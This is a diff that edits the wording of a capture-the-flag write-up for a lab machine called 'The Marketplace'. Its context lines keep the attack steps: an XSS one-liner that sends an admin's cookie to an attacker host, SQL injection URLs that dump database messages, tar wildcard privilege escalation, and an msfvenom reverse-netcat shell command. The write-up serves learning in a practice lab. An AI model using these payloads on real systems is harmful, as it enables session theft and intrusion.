@@ -1,5 +1,6 @@
 # The Marketplace
-## Difficulty: Medium
+### Difficulty: Medium
+------------------------------------------------------
 
 Let's start with nmap scan:
 ```bash
@@ -81,7 +82,7 @@ Let's move on to the "New listing" ("http://10.10.243.219/new") page:
 
 I'll try exploit this page with xss payloads,
 
-For beginning, I'll try the simplest exploit in the title input:
+For beginning, I'll try the simplest payload in the title input:
 ```html
 <script>alert(1)</script>
 ```
@@ -99,17 +100,17 @@ It works!
 
 Also when I'm navigating to the home page and clicking on this listing the alert pops out.
 
-This is a reflected and stored XSS!
+This is a stored XSS!
 
 The 2 options for this listing are: "Contact the listing author" and 
 "Report listing to admins" - when I report the listing the following message appears:
 
 ![image](https://user-images.githubusercontent.com/114166939/232110868-dbbdf845-0b1e-4333-834b-67b03616991e.png)
 
-Which means that after I reported the listing an admin opened it!
+Which means that after I reported the listing, an admin opened it!
 If that's the case I can try steal the admin's cookie.
 
-I'll use a code from this github page "https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md":
+I'll use a payload from this github page "https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md":
 (The Silent One-Liner)
 ```html
 <script>var i=new Image;i.src="http://[IP]:[PORT]/?"+document.cookie;</script>
@@ -120,7 +121,7 @@ Before add the listing, I'll establish python3 server on my attacker machine:
 ```bash
 python3 -m http.server
 ```
-I'll add the exploit:
+I'll add the payload:
 
 ![image](https://user-images.githubusercontent.com/114166939/232113668-933bb211-5ef9-4292-883c-694e716b164e.png)
 
@@ -179,7 +180,8 @@ http://10.10.243.219/admin?user=1'
 
 It's probably vulnerable, also it written that this website use MySQL server!
 
-Let's try find out how much columns are in the tables of this DataBase with SQL injection to the url:
+Let's try find out how much columns are in the tables of this DataBase with SQL injection,
+I'll add the "order by" payload to the url:
 ```url
 http://10.10.243.219/admin?user=1 order by 1-- -
 ```
@@ -197,7 +199,7 @@ http://10.10.243.219/admin?user=1 order by 5-- -
 
 ![image](https://user-images.githubusercontent.com/114166939/232224802-6d24f723-e9b9-4ae0-9f13-2ea59de55475.png)
 
-Let's find out if one of them is printable on the page with 'union select' sql command:
+Let's find out if one of them is printable on the page with 'union select' sql payload:
 
 (I'll add impossible value to the user parameter so it'll print only what I choose to print)
 ```url
@@ -239,7 +241,7 @@ Results:
 
 ![image](https://user-images.githubusercontent.com/114166939/232225759-2334b75d-5ec9-4459-8ab3-5a95fa5a5821.png)
 
-I'll dump the information in "message_content" column:
+I'll dump the information from "message_content" column:
 
 ```url
 http://10.10.243.219/admin?user=-999 union select group_concat(message_content),2,3,4 from marketplace.messages-- -
@@ -254,7 +256,7 @@ Now I can login to the SSH service with the password I got.
 
 There are only 4 users in the system, one of them is mine, so I can automate it with hydra or check it manually.
 
-Because it's only 3 users, did it manually and found out that the user which got this password is "jake".
+Because it's only 3 users, I did it manually and found that the user which got this password is "jake".
 
 I'll login as jake via SSH:
 
@@ -289,7 +291,7 @@ Results:
 
 The only thing this user can do as "michael" user is to run "/opt/backups/backup.sh" bash file.
 
-I'll go this location and cat this file:
+I'll go this location and print this file:
 
 ```bash
 cd /opt/backups/ && cat backup.sh
@@ -310,9 +312,9 @@ There is a known vulnerability with the "tar" command and wildcard which also me
 
 I'll use this technique to exploit this machine and get access to "michael" user.
 
-For this purpose I'll use this article "https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" under "Tar Wildcard Injection (1st method)" and will modify for my own needs:
+For this purpose I'll use this article "https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" under "Tar Wildcard Injection (1st method)" and will modify it for my own needs:
 
-I'll start by generating an exploit for the reverse shell using the "msfvenom" tool:
+I'll start by generating a payload for the reverse shell using the "msfvenom" tool:
 ```bash
 msfvenom -p cmd/unix/reverse_netcat lhost=[MY-IP] lport=6666 R
 ```
